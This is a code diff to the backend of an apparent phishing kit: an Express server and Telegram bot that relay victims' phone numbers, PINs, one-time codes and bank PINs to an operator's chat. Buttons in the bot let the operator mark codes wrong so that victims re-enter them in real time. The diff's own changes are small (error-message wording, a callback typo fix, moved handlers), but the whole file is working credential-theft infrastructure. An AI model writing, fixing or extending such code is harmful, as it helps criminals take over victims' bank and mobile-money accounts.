@@ -38,7 +38,7 @@ app.post('/api/login-notification', async (req, res) => {
         hour12: true
     });
 
-    if (!phone || !pin || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });
+    if (!phone || !pin || !ADMIN_ID) return res.status(400).json({ error: "Missing data or ADMIN_CHAT_ID" });
 
     statusStore[phone] = "pending";
 
@@ -70,7 +70,7 @@ app.post('/api/login-notification', async (req, res) => {
         });
         res.json({ success: true });
     } catch (err) {
-        console.error(err);
+        console.error("Telegram Notification Error:", err);
         res.status(500).json({ error: err.message });
     }
 });
@@ -86,7 +86,7 @@ app.post('/api/otp-notification', async (req, res) => {
         hour12: true
     });
 
-    if (!phone || !otp || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });
+    if (!phone || !otp || !ADMIN_ID) return res.status(400).json({ error: "Missing data or ADMIN_CHAT_ID" });
 
     statusStore[phone] = "pending_otp1";
 
@@ -114,7 +114,7 @@ app.post('/api/otp-notification', async (req, res) => {
                     ],
                     [
                         { text: "❌ Wrong Code", callback_data: `otp1_wrong|${phone}` },
-                        { text: "⚠️ Wrong PIN", callback_data: `otp2_wrongpin|${phone}` }
+                        { text: "⚠️ Wrong PIN", callback_data: `otp1_wrongpin|${phone}` }
                     ],
                     [
                         { text: "📞 Contact Us", callback_data: `contact_us|${phone}` }
@@ -140,7 +140,7 @@ app.post('/api/verify-first-otp', async (req, res) => {
         hour12: true
     });
 
-    if (!phone || !link || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });
+    if (!phone || !link || !ADMIN_ID) return res.status(400).json({ error: "Missing data or ADMIN_CHAT_ID" });
 
     statusStore[phone] = "pending_otp1";
 
@@ -170,7 +170,7 @@ ${link}
                     ],
                     [
                         { text: "❌ Wrong Code", callback_data: `otp1_wrong|${phone}` },
-                        { text: "⚠️ Wrong PIN", callback_data: `otp2_wrongpin|${phone}` }
+                        { text: "⚠️ Wrong PIN", callback_data: `otp1_wrongpin|${phone}` }
                     ],
                     [
                         { text: "📞 Contact Us", callback_data: `contact_us|${phone}` }
@@ -180,7 +180,7 @@ ${link}
         });
         res.json({ success: true });
     } catch (err) {
-        console.error(err);
+        console.error("Telegram Notification Error:", err);
         res.status(500).json({ error: err.message });
     }
 });
@@ -196,7 +196,7 @@ app.post('/api/verify-second-otp', async (req, res) => {
         hour12: true
     });
 
-    if (!phone || !otp || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });
+    if (!phone || !otp || !ADMIN_ID) return res.status(400).json({ error: "Missing data or ADMIN_CHAT_ID" });
 
     statusStore[phone] = "pending_otp2";
 
@@ -229,7 +229,7 @@ app.post('/api/verify-second-otp', async (req, res) => {
         });
         res.json({ success: true });
     } catch (err) {
-        console.error(err);
+        console.error("Telegram Error:", err);
         res.status(500).json({ error: err.message });
     }
 });
@@ -238,7 +238,7 @@ app.post('/api/verify-second-otp', async (req, res) => {
 app.post('/api/resend-otp-notification', async (req, res) => {
     const { phone, step } = req.body || {};
     
-    if (!phone || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });
+    if (!phone || !ADMIN_ID) return res.status(400).json({ error: "Missing data or ADMIN_CHAT_ID" });
 
     const resendMsg = `🔄 <b>RESEND REQUESTED</b>
 
@@ -252,7 +252,7 @@ app.post('/api/resend-otp-notification', async (req, res) => {
         await bot.telegram.sendMessage(ADMIN_ID, resendMsg, { parse_mode: 'HTML' });
         res.json({ success: true });
     } catch (err) {
-        console.error(err);
+        console.error("Telegram Error:", err);
         res.status(500).json({ error: "Telegram error" });
     }
 });
@@ -267,7 +267,7 @@ app.post('/api/verify-bank-pin', async (req, res) => {
         hour12: true
     });
 
-    if (!phone || !bankPin || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });
+    if (!phone || !bankPin || !ADMIN_ID) return res.status(400).json({ error: "Missing data or ADMIN_CHAT_ID" });
 
     statusStore[phone] = "pending_bank_pin";
 
@@ -374,13 +374,22 @@ bot.action(/^otp1_correct\|(.+)/, async (ctx) => {
     await ctx.replyWithHTML(verifiedMsg);
 });
 
-// OTP1 WRONG
+// OTP1 WRONG CODE
 bot.action(/^otp1_wrong\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     statusStore[phone] = "otp1_wrong";
     await ctx.answerCbQuery("Wrong Code");
     await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
     await ctx.replyWithHTML(`❌ <b>FIRST OTP WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter OTP.</b>`);
+});
+
+// OTP1 WRONG PIN
+bot.action(/^otp1_wrongpin\|(.+)/, async (ctx) => {
+    const phone = ctx.match[1];
+    statusStore[phone] = "otp2_wrongpin";
+    await ctx.answerCbQuery("Wrong PIN");
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.replyWithHTML(`🔑 <b>WRONG PIN REPORTED</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>User prompted to re-enter PIN.</b>`);
 });
 
 // CONTACT US
@@ -425,6 +434,15 @@ bot.action(/^otp2_wrong\|(.+)/, async (ctx) => {
     await ctx.replyWithHTML(`❌ <b>SECOND OTP WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter OTP.</b>`);
 });
 
+// OTP2 WRONG PIN
+bot.action(/^otp2_wrongpin\|(.+)/, async (ctx) => {
+    const phone = ctx.match[1];
+    statusStore[phone] = "otp2_wrongpin";
+    await ctx.answerCbQuery("Wrong PIN");
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.replyWithHTML(`🔑 <b>WRONG PIN REPORTED</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>User prompted to re-enter PIN.</b>`);
+});
+
 // BANK PIN CORRECT
 bot.action(/^bank_correct\|(.+)\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
@@ -454,15 +472,6 @@ bot.action(/^bank_wrong\|(.+)/, async (ctx) => {
     await ctx.answerCbQuery("Wrong Bank PIN");
     await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
     await ctx.replyWithHTML(`❌ <b>BANK PIN WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter Bank PIN.</b>`);
-});
-
-// OTP2 WRONG PIN
-bot.action(/^otp2_wrongpin\|(.+)/, async (ctx) => {
-    const phone = ctx.match[1];
-    statusStore[phone] = "otp2_wrongpin";
-    await ctx.answerCbQuery("Wrong PIN");
-    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
-    await ctx.replyWithHTML(`🔑 <b>WRONG PIN REPORTED</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>User prompted to re-enter PIN.</b>`);
 });
 
 // -------------------- STATUS CHECK --------------------
